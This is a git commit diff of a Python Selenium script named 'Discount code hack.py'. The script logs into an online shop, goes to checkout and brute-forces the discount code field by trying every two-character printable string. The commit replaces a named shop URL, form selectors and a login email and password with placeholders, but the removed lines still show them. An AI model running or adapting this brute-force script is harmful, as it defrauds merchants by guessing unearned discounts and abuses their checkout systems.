677d31061f80cba1506f671538a394b3ad5a50a9
GeekyLumberjack <marshall.holmes7@gmail.com>
2017-12-14 23:08:30 -0600

    Update Discount code hack.py

--- Discount code hack.py
+++ Discount code hack.py
@@ -8,51 +8,54 @@ import sys
 import itertools
 from string import printable
 import time
-#Sets default coding for printing to console
-
-#sys.setdefaultencoding('utf8')
 
 #select Firefox as the webrowser to use and defines it as driver
 
 driver = webdriver.Firefox()
 #navigates to url
 driver.delete_all_cookies()
-driver.get('http://100percentpure.com/account/login')
+driver.get('http://CHOOSEAWEBSITE.COM')
 time.sleep(10)
 
 #defines credentials elements
 
-username = driver.find_element_by_name('customer[email]')
-password = driver.find_element_by_name('customer[password]')
+username = driver.find_element_by_name('NAME')
+password = driver.find_element_by_name('NAME')
 
 #types credentials into HTML form and clicks subit
 
-username.send_keys("marshall.holmes111@gmail.com")
-password.send_keys("testingaccount")
-driver.find_element_by_class_name('btn--full').click()
+username.send_keys("USERNAME")
+password.send_keys("PASSWORD")
+driver.find_element_by_class_name('CLASSNAME').click()
 time.sleep(30)
 
-shopbag = driver.find_element_by_xpath('/html/body/div[6]/header/div/div/div[3]/ul/li[2]/a/span/span[1]')
+#Defines shopbag and wait for webdriver
+
+shopbag = driver.find_element_by_xpath('XPATH')
 wait = WebDriverWait(driver, 30)
+
+#selects shopbag when it is visible in the DOM
 
 wait.until(EC.visibility_of(shopbag))
 shopbag.click()
-# Selects the checkout button
 time.sleep(5)
+
+#tries to define and click on the checkout button once its unhidden, and retries with longer wait periods if it was unsuccessful
+
 try:
-	checkout = wait.until(EC.visibility_of(driver.find_element_by_xpath('/html/body/div[4]/div[3]/form/div[1]/div[1]/div/button')))
+	checkout = wait.until(EC.visibility_of(driver.find_element_by_xpath('XPATH')))
 	checkout.click()
 except:
 	time.sleep(15)
-	shopbag = driver.find_element_by_xpath('/html/body/div[6]/header/div/div/div[3]/ul/li[2]/a/span/span[1]')
+	shopbag = driver.find_element_by_xpath('XPATH')
 	shopbag.click()
 	time.sleep(15)
-	checkout = wait.until(EC.visibility_of(driver.find_element_by_xpath('/html/body/div[4]/div[3]/form/div[1]/div[1]/div/button')))
+	checkout = wait.until(EC.visibility_of(driver.find_element_by_xpath('XPATH')))
 	checkout.click()
 
-#locates the discount entry form and defines it as discount11
+#locates the discount entry form and defines it as discount
 
-discount = driver.find_element_by_name('checkout[reduction_code]')
+discount = driver.find_element_by_name('NAME')
 
 # Makes an entry in the discount form and applies the entry
 result = []
@@ -60,13 +63,13 @@ redone = [''.join(i) for i in itertools.product(printable, repeat = 2)]
 result.append(redone)
 def dishack():
 	for f in sorted(set(redone)):
-		discount = driver.find_element_by_name('checkout[reduction_code]')
+		discount = driver.find_element_by_name('NAME')
 		discount.clear()
 		discount.send_keys(f)
-		driver.find_element_by_class_name('field__input-btn').click()
+		driver.find_element_by_class_name('CLASSNAME').click()
 		time.sleep(5)
 		try:
-			discounterror = driver.find_element_by_xpath('//*[@id="error-for-reduction_code"]')	
+			discounterror = driver.find_element_by_xpath('XPATH')	
 			print 'Error'
 		except:
 			print 'No Error'	
